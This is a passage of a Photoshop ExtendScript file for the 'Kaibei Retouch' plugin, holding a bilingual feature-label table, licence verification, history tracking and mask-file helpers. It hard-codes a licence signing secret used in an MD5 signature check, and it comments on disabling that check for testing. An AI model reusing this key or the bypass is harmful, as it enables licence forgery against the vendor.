cTID = function (s) { return app.charIDToTypeID(s) };
sTID = function (s) { return app.stringIDToTypeID(s) };
app.displayDialogs = DialogModes.NO;
if (typeof ($) == 'undefined') $ = {};
var Progress, pDialog, globalFaceData, globalFunList = [];
$.localize = true;
$.local = {
  BackGround: { en: "BackGround", zh: "背景" },
  title: { en: "Kaibei Retouch", zh: "开贝修图" },
  repairLayer: { en: "$XT|repairLayer|", zh: "$XT|修饰层|" },
  cropCanvas: { en: "$XT|cropCanvas|", zh: "$XT|裁剪画布|" },
  listPage: { en: "$XT|listPage|", zh: "$XT|照片排版|" },
  doubleChin: { en: "$XT|doubleChin|", zh: "$XT|祛双下巴|" },
  // repairChin: { en: "$XT|repairChin|", zh: "$XT|双下巴修复|" },
  rotateCanvas: { en: "rotateCanvas", zh: "旋转画布" },
  saveDoc: { en: "saveDoc", zh: "保存照片" },
  getBatEffect: { en: "getBatEffect", zh: "保存为配方" },
  mergeEffect: { en: "mergeEffect", zh: "合并效果" },
  deleteEffect: { en: "deleteEffect", zh: "删除效果" },
  compareEffect: { en: "compareEffect", zh: "对比原图" },
  layerColor: { en: "$XT|layerColor|", zh: "$XT|图层颜色|" },
  protectColor: { en: "$XT|protectColor|", zh: "$XT|颜色保护层|" },
  controlGrey: { en: "$XT|controlGrey|", zh: "$XT|中性灰操作层|" },
  textProgress: { en: "Processing: ", zh: "正在：" },
  errProgress: { en: "Error: ", zh: "错误：" },
  promptProgress: { en: "Prompt: ", zh: "提示：" },
  nofaceTip: { en: "No face was detected", zh: "未检测到人脸" },
  nobodyTip: { en: "No body was detected", zh: "未检测到身体" },
  noteethTip: { en: "No teeth was detected", zh: "未检测到牙齿" },
  noeyebrowTip: { en: "No eyebrow was detected", zh: "未检测到眉毛" },
  noGenderfaceTip: { en: "No face of corresponding gender were detected", zh: "未检测到对应性别的人脸" },
  noGenderbodyTip: { en: "No body of corresponding gender were detected", zh: "未检测到对应性别的身体" },
  noGenderteethTip: { en: "No teeth of corresponding gender were detected", zh: "未检测到对应性别的牙齿" },
  noGenderEyebrowTip: { en: "No eyebrow of corresponding gender were detected", zh: "未检测到对应性别的眉毛" },
  noFrontfaceTip: { en: "No positive face was detected", zh: "未检测到正面人脸" },
  nodataTip: { en: "No relevant data was detected", zh: "未检测到人体腿部" },
  faceTooSmall: { en: "The face of this photo is too small to be processed", zh: "此照片面部太小未做处理" },
  noCurrentDoc: { en: "The current processing document is closed", zh: "当前处理文档被关闭" },
  noSrcFile: { en: "No original photo was found", zh: "没有找到原片" },
  textConvertRGB: { en: "This feature only supports RGB schema documents.\r\rTip: Convert document color mode method: image-mode-RGB color", zh: "此功能仅支持RGB模式文档。\r\r提示：转换文档颜色模式方法：图像 - 模式 - RGB颜色" },
  textSelectArea: { en: "This function requires that you first use the lasso tool to select the area that needs to be processed.\r\rSuggestion: Select a small area of the face or body, not the whole face or body at once.", zh: "此功能需要先用套索工具选取需要处理的区域。\r\r建议：选择脸部或身体的小部分区域，不要一次选择整个面部或身体。" },
  fairSelectArea: { en: "This function requires that you first select the area where you need a hair transplant.", zh: "此功能需要先选取需要植发的区域。" },
  noPeopleArr: { en: "This function cannot be used because of low graphics memory or GPU options. \r\r is recommended to use NVIDIA graphics cards above 8G memory.", zh: "显存过低或GPU选项原因导致此功能无法使用。\r\r建议使用8G显存以上的NVIDIA RTX显卡。" },
  skinLocal: { en: "$XT|skinLocal|", zh: "$XT|局部平滑|" },
  skinFlatten: { en: "$XT|skinFlatten|", zh: "$XT|强力祛皱|" },
  removeFlaw: { en: "$XT|removeFlaw|", zh: "$XT|祛除瑕疵|" },
  colorRepair: { en: "$XT|colorRepair|", zh: "$XT|自动肤色统一|" },
  skinUnify: { en: "$XT|skinUnify|", zh: "$XT|AI肤色统一|" },
  skinEven: { en: "$XT|skinEven|", zh: "$XT|局部肤色均匀|" },
  skinYellow: { en: "$XT|skinYellow|", zh: "$XT|皮肤美白|" },
  skinWhiten: { en: "$XT|skinWhiten|", zh: "$XT|皮肤美白-|" },
  skinLight: { en: "$XT|skinLight|", zh: "$XT|皮肤透亮|" },
  skinRuddy: { en: "$XT|skinRuddy|", zh: "$XT|皮肤红润|" },
  removeYellow: { en: "$XT|removeYellow", zh: "$XT|皮肤祛黄|" },
  removeRed: { en: "$XT|removeRed", zh: "$XT|皮肤祛红|" },
  removeGreen: { en: "$XT|removeGreen", zh: "$XT|皮肤祛绿|" },

  localWhiten: { en: "$XT|localWhiten|", zh: "$XT|局部美白|" },
  skinGrain: { en: "$XT|skinGrain|", zh: "$XT|皮肤纹理|" },
  skinTexture: { en: "$XT|skinTexture|", zh: "$XT|皮肤质感|" },
  skinLuster: { en: "$XT|skinLuster|", zh: "$XT|皮肤光泽|" },
  skinTone: { en: "$XT|skinTone|", zh: "$XT|皮肤着色|" },
  skinBasic: { en: "$XT|skinBasic|", zh: "$XT|强力磨皮|" },
  skinAuto: { en: "$XT|skinAuto|", zh: "$XT|高低频磨皮|" },
  deadSkin: { en: "$XT|deadSkin|", zh: "$XT|新生儿祛死皮|" },
  bloodEyes: { en: "$XT|bloodEyes|", zh: "$XT|眼睛祛血丝|" },
  beautifyEyes: { en: "$XT|beautifyEyes|", zh: "$XT|眼神光增强|" },
  removeBeard: { en: "$XT|removeBeard|", zh: "$XT|祛胡渣|" },
  repairLip: { en: "$XT|repairLip|", zh: "$XT|唇纹修复|" },
  removeEyebag: { en: "$XT|removeEyebag|", zh: "$XT|祛眼袋|" },
  addUnderyes: { en: "$XT|addUnderyes|", zh: "$XT|添加卧蚕|" },
  eyeMakeup: { en: "$XT|eyeMakeup|", zh: "$XT|眼妆增强|" },
  lipMakeup: { en: "$XT|lipMakeup|", zh: "$XT|唇妆增强|" },
  eyeBrow: { en: "$XT|eyeBrow|", zh: "$XT|眉毛增强|" },
  creamyFoundation: { en: "$XT|creamyFoundation|", zh: "$XT|粉底|" },
  rosyBlush: { en: "$XT|rosyBlush|", zh: "$XT|添加腮红|" },
  skinCorrect: { en: "$XT|skinCorrect|", zh: "$XT|皮肤偏色校准|" },
  fillHairline: { en: "$XT|fillHairline|", zh: "$XT|发缝填充|" },
  removeHeadhair: { en: "$XT|removeHeadhair|", zh: "$XT|祛头部碎发|" },
  removeFacehair: { en: "$XT|removeFacehair|", zh: "$XT|祛脸部碎发|" },
  hairNurse: { en: "$XT|hairNurse|", zh: "$XT|头发柔顺|" },
  mascaraEyelashes: { en: "$XT|mascaraEyelashes|", zh: "$XT|睫毛膏|" },
  hairBright: { en: "$XT|hairBright|", zh: "$XT|头发光泽|" },
  hairDyeing: { en: "$XT|hairDyeing|", zh: "$XT|头发染色|" },
  eyeShadow: { en: "$XT|eyeShadow|", zh: "$XT|眼影|" },
  lipGloss: { en: "$XT|lipGloss|", zh: "$XT|智能唇彩|" },
  lipStick: { en: "$XT|lipStick|", zh: "$XT|唇彩|" },
  surveyLayerSet: { en: "$XT|surveyLayerSet|", zh: "$XT|观察图层组|" },
  surveyLayer_Grayscale: { en: "$XT|surveyGrayscale|", zh: "$XT|黑白观察层|" },
  surveyLayer_Contrast: { en: "$XT|surveyContrast|", zh: "$XT|对比度观察层|" },
  surveyLayer_Reverse: { en: "$XT|surveyReverse|", zh: "$XT|反相观察层|" },
  surveyLayer_Texture: { en: "$XT|surveyTexture|", zh: "$XT|纹理观察层|" },
  surveyLayer_Saturation: { en: "$XT|surveySaturation|", zh: "$XT|饱和度观察层|" },
  shadowAdjust: { en: "$XT|shadowAdjust|", zh: "$XT|阴影调整|" },
  highlightAdjust: { en: "$XT|highlightAdjust|", zh: "$XT|高光调整|" },
  shadowEven: { en: "$XT|shadowEven|", zh: "$XT|光影均匀|" },
  solidAuto: { en: "$XT|solidAuto|", zh: "$XT|自动立体光|" },
  shadowAuto: { en: "$XT|shadowAuto|", zh: "$XT|人物立体光|" },
  structureLight: { en: "$XT|structureLight|", zh: "$XT|3D结构光|" },
  dbCurves: { en: "$XT|dbCurves|", zh: "$XT|双曲线|" },
  mediumGrey: { en: "$XT|mediumGrey|", zh: "$XT|中性灰|" },
  softLight: { en: "$XT|softLight|", zh: "$XT|柔光层|" },
  bgDecontamination: { en: "$XT|bgDecontamination|", zh: "$XT|背景去污|" },
  localDecontamination: { en: "$XT|localDecontamination|", zh: "$XT|局部去污|" },
  lengthenLeg: { en: "$XT|lengthenLeg|", zh: "$XT|拉长腿|" },
  lengthenLegSet: { en: "$XT|lengthenLegSet|", zh: "$XT|设置高度|" },
  smartPull: { en: "$XT|smartPull|", zh: "$XT|智能修身|" },
  defectRepair: { en: "$XT|defectRepair|", zh: "$XT|瑕疵修复|" },
  liquefyFace: { en: "$XT|liquefyFace|", zh: "$XT|液化瘦脸|" },
  jawReduce: { en: "$XT|jawReduce|", zh: "$XT|缩小下颚|" },
  faceReduce: { en: "$XT|faceReduce|", zh: "$XT|缩小脸宽|" },
  headCir: { en: "$XT|headCir|", zh: "$XT|缩小头围|" },
  chinFrap: { en: "$XT|chinFrap|", zh: "$XT|收缩下巴|" },
  eyeGrow: { en: "$XT|eyeGrow|", zh: "$XT|放大眼睛|" },
  noseReduce: { en: "$XT|noseReduce|", zh: "$XT|缩小鼻翼|" },
  skyReplacement: { en: "$XT|skyReplacement|", zh: "$XT|天空替换|" },
  skyReplacementOld: { en: "$XT|skyReplacementOld|", zh: "$XT|天空替换|" },
  skyEarse: { en: "skyEarse", zh: "擦除天空" },
  skyGroup: { en: "Sky Replacement Group", zh: "天空替换组", zh_TW: "天空取代群組" },
  skyBrightness: { en: "Sky Brightness", zh: "天空亮度" },
  skyTemperature: { en: "Sky Temperature", zh: "天空色温" },
  skyLayer: { en: "Sky", zh: "天空" },
  skyLighting: { en: "Foreground Lighting", zh: "前景光照", zh_TW: "前景光源" },
  skyColor: { en: "Foreground Color", zh: "前景色" },
  particleLight: { en: "$XT|particleLight|", zh: "$XT|粒子光|" },
  addMaterial: { en: "$XT|addMaterial|", zh: "$XT|添加素材|" },
  softFocus: { en: "$XT|softFocus|", zh: "$XT|高光柔焦|" },
  globalSoftFocus: { en: "$XT|globalSoftFocus|", zh: "$XT|柔焦滤镜|" },
  effectHDR: { en: "$XT|effectHDR|", zh: "$XT|HDR特效|" },
  reduceNoise: { en: "$XT|reduceNoise|", zh: "$XT|降噪|" },
  aroundHalo: { en: "$XT|aroundHalo|", zh: "$XT|晕影|" },
  sharpenClear: { en: "$XT|sharpenClear|", zh: "$XT|锐化清晰|" },
  texturePlus: { en: "$XT|texturePlus|", zh: "$XT|质感增强|" },
  levelPlus: { en: "$XT|levelPlus|", zh: "$XT|层次增强|" },
  thoroughPlus: { en: "$XT|thoroughPlus|", zh: "$XT|通透增强|" },
  cameraRaw: { en: "$XT|cameraRaw|", zh: "$XT|cameraRaw|" },
  toneEffect: { en: "$XT|toneEffect|", zh: "$XT|艺术色调|" },
  copyColor: { en: "$XT|copyColor|", zh: "$XT|AI仿色|" },
  colorAdjustment: { en: "$XT|colorAdjustment|", zh: "$XT|色彩调整|" },
  reduceYellow: { en: "$XT|reduceYellow", zh: "$XT|祛黄|" },
  reduceRed: { en: "$XT|reduceRed", zh: "$XT|祛红|" },
  reduceBlue: { en: "$XT|reduceBlue", zh: "$XT|祛蓝|" },
  reduceGreen: { en: "$XT|reduceGreen", zh: "$XT|祛绿|" },
  addRed: { en: "$XT|addRed", zh: "$XT|加红|" },
  addBlue: { en: "$XT|addBlue", zh: "$XT|加蓝|" },
  addSaturation: { en: "$XT|addSaturation", zh: "$XT|颜色增强|" },
  reduceSaturation: { en: "$XT|reduceSaturation", zh: "$XT|颜色减弱|" },
  reduceBlueEye: { en: "$XT|reduceBlueEye|", zh: "$XT|眼睛祛蓝|" },
  autoFreckle: { en: "$XT|autoFreckle|", zh: "$XT|自动祛斑|" },
  skinBrighten: { en: "skinBrighten", zh: "皮肤提亮" },
  skinDodge: { en: "skinDodge", zh: "皮肤减淡" },
  skinBrightenDodge: { en: "$XT|skinBrightenDodge|", zh: "$XT|皮肤提亮减淡|" },
  autoDB: { en: "$XT|autoDB|", zh: "$XT|中性灰磨皮|" },
  applyPeifang: { en: "applyPeifang", zh: "应用配方" },
  insertOriginal: { en: "$XT|insertOriginal|", zh: "$XT|置入原片|" },
  meticulousPainting: { en: "$XT|meticulousPainting|", zh: "$XT|工笔风|" },
  textureSkin: { en: "$XT|textureSkin|", zh: "$XT|润肤磨皮|" },
  preciseSkin: { en: "$XT|preciseSkin|", zh: "$XT|精准磨皮|" },
  cleanTeeth: { en: "$XT|cleanTeeth|", zh: "$XT|牙齿美白|" },
  removeStain: { en: "$XT|removeStain|", zh: "$XT|服装去白点|" },
  removeBGStain: { en: "$XT|removeBGStain|", zh: "$XT|背景去白点|" },
  bgWrinkle: { en: "$XT|bgWrinkle|", zh: "$XT|背景祛瑕疵|" },
  clothingWrinkle: { en: "$XT|clothingWrinkle|", zh: "$XT|服装祛皱|" },

  openFile: { en: "openFile", zh: "打开文件" },
  adjustEffect: { en: "adjustEffect", zh: "调整效果" },

  inputXMP: { en: "inputXMP", zh: "导入色调" },
  //================================================
  readyGo: { en: "$XT|readyGo|", zh: "$XT|准备|" },
  autoColor: { en: "$XT|autoColor|", zh: "$XT|AI校色|" },
  correctColor: { en: "$XT|correctColor|", zh: "$XT|偏色校准|" },
  correctTone: { en: "$XT|correctTone|", zh: "$XT|色调校准|" },
  autoExposure: { en: "$XT|autoExposure|", zh: "$XT|自动曝光|" },
  addBrighten: { en: "$XT|addBrighten|", zh: "$XT|提亮|" },
  addDodge: { en: "$XT|addDodge|", zh: "$XT|压暗|" },
  dodgeRepair: { en: "$XT|dodgeRepair|", zh: "$XT|暗部提亮|" },
  highlightRepair: { en: "$XT|highlightRepair|", zh: "$XT|高光修复|" },
  lightRepair: { en: "$XT|lightRepair|", zh: "$XT|曝光修复|" },
  throughPlus: { en: "$XT|throughPlus|", zh: "$XT|通透增强|" },
  photoStyle: { en: "$XT|photoStyle|", zh: "$XT|调色滤镜|" },
  contrast: { en: "$XT|contrast|", zh: "$XT|对比增强|" },
  colorful: { en: "$XT|colorful|", zh: "$XT|鲜艳度|" },
  skinFine: { en: "$XT|skinFine|", zh: "$XT|精细磨皮|" },
  dirtyRemove: { en: "$XT|dirtyRemove|", zh: "$XT|穿帮修饰|" },
  magicEraser: { en: "$XT|magicEraser|", zh: "$XT|智能瑕疵修复|" },
  skinThrough: { en: "$XT|skinThrough|", zh: "$XT|皮肤通透|" },
  eyesMakeup: { en: "$XT|eyesMakeup|", zh: "$XT|美化眼睛|" },
  villiFade: { en: "$XT|villiFade|", zh: "$XT|淡化绒毛|" },
  teethWhiten: { en: "$XT|teethWhiten|", zh: "$XT|牙齿局部美白|" },
  stagePlus: { en: "$XT|stagePlus|", zh: "$XT|层次增强|" },
  texturePlus: { en: "$XT|texturePlus|", zh: "$XT|质感增强|" },
  darkCorner: { en: "$XT|darkCorner|", zh: "$XT|添加暗角|" },
  Blush: { en: "$XT|Blush|", zh: "$XT|腮红|" },
  localSharpen: { en: "$XT|localSharpen|", zh: "$XT|局部锐化|" },
  changeBG: { en: "$XT|changeBG|", zh: "$XT|更换背景|" },
  adjustEdge: { en: "adjustEdge", zh: "优化边缘" },
  editMask: { en: "editMask", zh: "调整蒙板" },
  selMask: { en: "selMask", zh: "修改蒙板" },
  //================================================
  neckLines: { en: "$XT|neckLines|", zh: "$XT|祛颈纹|" },
  stretchMarks: { en: "$XT|stretchMarks|", zh: "$XT|祛妊娠纹|" },
  eyeWrinkles: { en: "$XT|eyeWrinkles|", zh: "$XT|祛眼周纹|" },
  noseWrinkles: { en: "$XT|noseWrinkles|", zh: "$XT|祛法令纹|" },
  foreheadWrinkles: { en: "$XT|foreheadWrinkles|", zh: "$XT|祛抬头纹|" },
  localWrinkles: { en: "$XT|localWrinkles|", zh: "$XT|局部皱纹修复|" },
  noseFlank: { en: "$XT|noseFlank|", zh: "$XT|鼻梁增强|" },
  bodyskinEven: { en: "$XT|bodyskinEven|", zh: "$XT|全身肤色均匀|" },
  hdRepair: { en: "$XT|hdRepair|", zh: "$XT|高清修复|" },
  removeGlossy: { en: "$XT|removeGlossy|", zh: "$XT|祛油光|" },
  slimBody: { en: "$XT|slimBody|", zh: "$XT|AI瘦身美型|" },
  emphasizeSubject: { en: "$XT|emphasizeSubject|", zh: "$XT|突出主体|" },
  shadowRepair: { en: "$XT|shadowRepair|", zh: "$XT|光影修复|" },
  //================================================
  getSkinArea: { en: "$XT|getSkinArea|", zh: "$XT|获取皮肤选区|" },
  getClotheArea: { en: "$XT|getClotheArea|", zh: "$XT|获取衣服选区|" },
  getHairArea: { en: "$XT|getHairArea|", zh: "$XT|获取头发选区|" },
  //================================================
  chinSDRepair: { en: "$XT|chinSDRepair|", zh: "$XT|双下巴修复|" },
  neckSDRepair: { en: "$XT|neckSDRepair|", zh: "$XT|颈纹修复|" },
  teethSDRepair: { en: "$XT|teethSDRepair|", zh: "$XT|牙齿修复|" },
  eyebrowSDRepair: { en: "$XT|eyebrowSDRepair|", zh: "$XT|眉毛重绘|" },
  eyelidSDRepair: { en: "$XT|eyelidSDRepair|", zh: "$XT|双眼皮重绘|" },
  faceSDGenerate: { en: "$XT|faceSDGenerate|", zh: "$XT|AI换脸|" },
  smileSDRepair: { en: "$XT|smileSDRepair|", zh: "$XT|笑容美化|" },
  hairSDGenerate: { en: "$XT|hairSDGenerate|", zh: "$XT|AI植发|" },
  hairSDRepair: { en: "$XT|hairSDRepair|", zh: "$XT|头发重绘|" },
  fairSDBlacken: { en: "$XT|fairSDBlacken|", zh: "$XT|头发染黑|" },
  clothingSDRepair: { en: "$XT|clothingSDRepair|", zh: "$XT|服装重绘|" },
  clothingSDGenerate: { en: "$XT|clothingSDGenerate|", zh: "$XT|AI换装|" },
}
$._Kaibei = {
  userData: {}, //用户数据,下行为测试时使用
  // userData: {
  //   auth: { type: 3, emphasizeSubject:3, localDecontamination:3, removeGlossy:3, repairChin:3, slimBody:3, hdRepair:3, bodyskinEven:3, noseFlank:3, localWrinkles:3, foreheadWrinkles:3, noseWrinkles:3, eyeWrinkles:3, stretchMarks:3, neckLines:3, skinCorrect:3, preciseSkin:3, doubleChin:3, listPage:3, cropCanvas:3, changeBG:3, addBrighten:3, addDodge:3, dodgeRepair:3, bgWrinkle:3, clothingWrinkle:3, localWhiten:2, skinYellow:2, autoColor:3, correctColor:3, magicEraser:3, solidAuto: 3, structureLight: 3, reduceNoise: 3, shadowAdjust: 3, highlightAdjust: 3, meticulousPainting: 3, autoDB: 3, skinBrightenDodge: 2, autoFreckle: 2, reduceBlueEye: 3, colorAdjustment: 3, skinBasic: 2, skinAuto: 2, textureSkin: 2, skinTone: 2, skinLuster: 2, highlightRepair: 3, skinTexture: 2, skinGrain: 2, skinWhiten: 2, skinLight: 2, skinRuddy: 2, skinEven: 2, colorRepair: 2, skinUnify: 2, removeFlaw: 2, skinFlatten: 2, skinLocal: 2, beautifyEyes: 3, teethWhiten: 3, cleanTeeth: 3, creamyFoundation: 3, rosyBlush: 3, hairNurse: 3, mascaraEyelashes: 3, hairBright: 3, hairDyeing: 3, eyeShadow: 3, lipGloss: 3, surveyLayer: 3, shadowEven: 3, shadowAuto: 3, dbCurves: 3, mediumGrey: 3, softLight: 3, bgDecontamination: 3, lengthenLeg: 3, smartPull: 3, defectRepair: 3, liquefyFace: 3, skyReplacementOld: 3, skyReplacement: 3, particleLight: 3, addMaterial: 3, softFocus: 3, globalSoftFocus: 3, effectHDR: 3, aroundHalo: 3, sharpenClear: 3, texturePlus: 3, levelPlus: 3, thoroughPlus: 3, cameraRaw: 3, toneEffect: 3 }
  //   , use: 0 //0:放行，>0:起始时间 new Date().getTime()
  //   , stp: 0 //是否立即停止
  //   , cmd: '' //jsCode
  //   , name_en: 'kbxt' //软件标识
  //   , version: { version: { version: '4.1.0' } } //软件版本
  //   , enable_gpu: !0 //支持GPU加速
  // },
  jsxFolder: $.fileName.split('/').slice(0, -1).join('/') + '/', //根目录
  tempFolder: Folder.userData.fsName.replace(/\\/g, '/') + '/Kaibei/Xiutu/Temp/',
  argPutValue: function (arg, val) { //接受外部参数赋值
    if (arg) this.userData[arg] = val;
    else this.userData = val ? JSON.parse(val) : {};
    // this.enable_gpu = 8; //test
    // $._Kaibei.sendEvent({ type: 'userData', data: this.userData })
  },
  funNameToFunID: function (funName) { //功能名转换为功能ID
    for (key in $.local) {
      if (localize($.local[key]) == funName) return key;
    }
  },
  getFileName: function (path) { //获取文件名
    return File(path).name.replace(/\.[^\.]+$/, '')
  },
  batFunCheck: function (funID) { //批量功能列表
    var funArray = [
      "autoColor",
      "copyColor",
      "toneEffect",
      "correctTone",
      "autoExposure",
      "correctColor",
      "addBrighten",
      "addDodge",
      "dodgeRepair",
      "highlightRepair",
      "autoFreckle",
      "autoDB",
      "preciseSkin",
      "textureSkin",
      "skinBasic",
      "skinTexture",
      "deadSkin",
      "doubleChin",
      "neckLines",
      "eyeWrinkles",
      "noseWrinkles",
      "foreheadWrinkles",
      "removeEyebag",
      "bloodEyes",
      "repairLip",
      "removeBeard",
      "removeGlossy",
      "skinUnify",
      "bodyskinEven",
      "skinYellow",
      "skinLight",
      "skinRuddy",
      "removeYellow",
      "removeRed",
      "removeGreen",
      "skinTone",
      "shadowRepair",
      "structureLight",
      "thoroughPlus",
      "levelPlus",
      "emphasizeSubject",
      "jawReduce",
      "faceReduce",
      "headCir",
      "chinFrap",
      "eyeGrow",
      "noseReduce",
      "slimBody",
      "lengthenLeg",
      "lipGloss",
      "noseFlank",
      "beautifyEyes",
      "addUnderyes",
      "rosyBlush",
      "cleanTeeth",
      "eyeBrow",
      "eyeMakeup",
      "lipMakeup",
      "fillHairline",
      "removeHeadhair",
      "bgDecontamination",
      "bgWrinkle",
      "clothingWrinkle",
      "removeStain",
      "removeBGStain",
      "hdRepair",
      "reduceNoise",
      "aroundHalo",
      "sharpenClear",
      "texturePlus",
      "reduceYellow",
      "reduceRed",
      "reduceBlue",
      "reduceGreen",
      "addSaturation",
      "reduceSaturation",
      "meticulousPainting",
      "effectHDR",
      "globalSoftFocus",
      "changeBG",
      "cropCanvas",
      "listPage",
      "cameraRaw"
    ];
    for (var i = 0; i < funArray.length; i++) { if (funArray[i] == funID) return !0 } return !1;
  },
  createSign: function () { //数据校验函数
    function sortArr(params) {
      var arr = []
      for (var key in params) {
        arr.push(key)
      }
      for (var i = 0; i < arr.length - 1; i++) {
        for (var j = 0; j < arr.length - 1 - i; j++) {
          if (arr[j].charCodeAt(0) > arr[j + 1].charCodeAt(0)) {
            var temp = arr[j];
            arr[j] = arr[j + 1];
            arr[j + 1] = temp;
          }
        }
      }
      return arr
    }
    var params = this.userData.auth;
    var keyparam = sortArr(params);
    // alert('params:'+JSON.stringify(params));
    // alert('keyparam:'+JSON.stringify(keyparam));
    const SIGN_KEY = 'ymwMDAk03EjRFu7gRxB6ufhsQhDD9nDq'; //签名
    var separator = '&%';
    var string = '';
    var array = ['token=' + this.userData.token];
    for (var i = 0; i < keyparam.length; i++) {
      array.push(keyparam[i] + '=' + JSON.stringify(params[keyparam[i]]));
    }
    string = array.join(separator) + separator + 'key=' + SIGN_KEY;
    // alert(md5(string).toUpperCase()+'\n'+this.userData.sign+'\n'+JSON.stringify(array.join(separator)));
    return md5(string).toUpperCase() != this.userData.sign;
  },
  funcRun: function (arg, product_code) { //数据校验
    if (product_code == 'Retouch' && app.documents.length == 0) return !1;
    if (!this.userData.hasOwnProperty('auth') || !this.userData.hasOwnProperty('name_en')) return !1;
    if (!this.userData.hasOwnProperty('version') || !this.userData.version.hasOwnProperty('version')) return !1;
    if (this.createSign() == !0) return !1; //测试时注销此行
    if (this.userData.name_en == 'kbxt' && !this.compareVersion(this.userData.version.version, '3') && $.os.indexOf("Windows") > -1) return !1; //3.0以下版本
    else if (this.userData.name_en == 'roc' && !this.compareVersion(this.userData.version.version, '1.2') && $.os.indexOf("Windows") > -1) return !1; //1.2.0以下版本
    if (product_code == 'Retouch' && this.userData.auth.type < 2) return !1; //免费版
    if (psVersion < 21) { alert('开贝修图Max仅支持PS2020及以上版本。', ' '); return !1 }
    arg = arg || '{}';
    try { var data = (typeof (arg) == 'object' ? arg : JSON.parse(arg)) } catch (e) { return 0 }//alert(e+'\n\n'+arg);
    this.iptErr(1); //单功能关闭PS
    //保存功能列表
    if (!data.isbat && product_code == 'Retouch') {
      var argVal = JSON.parse(JSON.stringify(data));
      delete argVal['id'];
      delete argVal['file'];
      delete argVal['fun'];
      delete argVal['tool'];
      delete argVal['enable_gpu'];
      delete argVal['titleData'];
      this.saveFunList(app.activeDocument.id, argVal);
      // this.log({ type: '功能列表数据', argVal: argVal, globalFunList: globalFunList })
    }
    return data;
  },
  saveFunList: function (docID, argVal) { //保存照片执行过的功能列表
    if (argVal && argVal.funID == 'listPage' && argVal.photoNum == undefined) return !1;
    if (!docID) {
      if (app.documents.length == 0) return !1;
      docID = app.activeDocument.id;
    }
    for (var i = 0; i < globalFunList.length; i++) {
      if (globalFunList[i].id != docID) continue;
      var data = globalFunList[i].data;
      //保存当前图层的功能参数值
      var defVal = this.saveDefault(!0);
      if (defVal) { //当前功能有值时
        defVal = JSON.parse(defVal);
        if (data.length && data[data.length - 1].funID == defVal.funID) { //重复执行当前功能时，更新赋值
          data[data.length - 1] = assign(data[data.length - 1], defVal.data);
        }
      }
      //保存当前功能参数值
      if (argVal && this.batFunCheck(argVal.funID)) { //执行当前功能是批量功能时
        if (data.length && data[data.length - 1].funID == argVal.funID) data[data.length - 1] = argVal; //更新参数
        else data.push(argVal); //添加一步
      }
      // this.sendEvent({ type: '保存功能列表', data: data })
      return data;
    }
    if (argVal && this.batFunCheck(argVal.funID)) {
      globalFunList.push({ id: docID, data: [argVal] }); //添加一步
      // this.sendEvent({ type: '功能列表数据', data: globalFunList })
      return globalFunList[globalFunList.length - 1].data;
    }
  },
  updateFunList: function () { //刷新功能列表
    // try {
    var docIDList = [];
    for (var i = 0; i < app.documents.length; i++) {
      docIDList.push(app.documents[i].id);
    }
    if (!docIDList.length) return;
    var tmpFunList = [];
    for (var i = 0; i < globalFunList.length; i++) {
      if (this.findIndex(docIDList, globalFunList[i].id) > -1) tmpFunList.push(globalFunList[i])
    }
    globalFunList = tmpFunList;
    // this.sendEvent({ type: '更新列表数据', globalFunList: globalFunList })
    // } catch (e) { return e + e.line }
  },
  getFunList: function (isCurrentFun) { //获取功能列表
    try {
      var funList = this.saveFunList();
      if (isCurrentFun) return JSON.stringify(funList ? funList[funList.length - 1] : {})
      else return JSON.stringify(funList || []) //获取所有步骤
    } catch (e) { alert(e + e.line); return e }
  },
  compareVersion: function (curV, reqV) { //版本号比较
    //传入两个字符串，当前版本号：curV；比较版本号：reqV
    //调用方法举例：compare("1.2.0","1.1.0")，将返回true
    if (!curV || !reqV) return false;
    var arr1 = curV.split('.'), arr2 = reqV.split('.');
    var minLength = Math.min(arr1.length, arr2.length), position = 0, diff = 0;
    while (position < minLength && ((diff = parseInt(arr1[position]) - parseInt(arr2[position])) == 0)) position++;
    diff = (diff != 0) ? diff : (arr1.length - arr2.length);
    return diff > 0;
  },
  readFile: function (sourceFile, encodeing) { //读取文本内容
    var file = new File(sourceFile);
    var txtStr = '';
    if (file.exists) {
      file.open('r');
      file.encoding = encodeing || "UTF8";
      file.lineFeed = "unix";
      file.open("r", "TEXT", "????");
      var txtStr = file.read();
      file.close();
    }
    return txtStr;
  },
  sendEvent: function (data) { //发送消息给CEP
    try { var xLib = new ExternalObject("lib:PlugPlugExternalObject") } catch (e) { }
    if (xLib) {
      var eventObj = new CSXSEvent();
      eventObj.type = "com.server.fromJsx";
      eventObj.data = JSON.stringify(data);
      eventObj.dispatch();
    }
  },
  log: function (data) {
    this.sendEvent({ type: 'jsxLog', data: data })
  },
  getMaskFile: function (funData, typeName, arg) { //获取抠图蒙板文件/瘦身成品文件
    // var maskFile = $._Kaibei.tempFolder + 'mask.png';
    var doc = app.activeDocument;
    var fileName = typeName == 'maskApi' ? 'maskMatting.png' : 'slimBody.jpg';
    var maskFile = '';
    try {//保存过
      var docPath = doc.fullName.fsName; //当前文件路径
      if (docPath.indexOf('KBXiutuMaxPhotos') > -1) { //导入的照片
        if (File(docPath).parent.name == 'e9aef383da0075e2f0db8837b7ea57bc') maskFile = slashPath(File(docPath).parent.parent.fsName) + '/mask/' + fileName; //在效果文件夹
        else maskFile = slashPath(File(docPath).parent.fsName) + '/mask/' + fileName; //在原文件夹
      } else maskFile = slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + md5(docPath) + '/' + fileName; //PS打开的照片
    } catch (e) {//没有保存过
      maskFile = slashPath(Folder.userData.fsName) + '/Kaibei/Xiutu/keypoints/' + doc.id + '/' + fileName; //PS中没有保存的照片
    }
    if (File(maskFile).exists) return maskFile;
    if (funData.indexOf('firstOK') < 0) { //首次获取标识
      funData = funData.replace('firstGo', 'firstOK'); //取消首次获取标识
      this.sendEvent({ type: typeName, data: { funData: funData, maskFile: maskFile, arg: arg } }); //没有蒙板文件时
      return '' //首次获取返回空值
    } else return maskFile; //获取失败时返回路径
  },
  getAreaFile: function (Area) { //获取区域蒙板文件
    var doc = app.activeDocument;
    try {//保存过
      var docPath = doc.fullName.fsName; //当前文件路径
      if (docPath.indexOf('KBXiutuMaxPhotos') > -1) { //导入的照片
        if (File(docPath).parent.name == 'e9aef383da0075e2f0db8837b7ea57bc') return slashPath(File(docPath).parent.parent.fsName) + '/mask/mask' + Area + '.png'; //在效果文件夹
        else return slashPath(File(docPath).parent.fsName) + '/mask/mask' + Area + '.png'; //在原文件夹
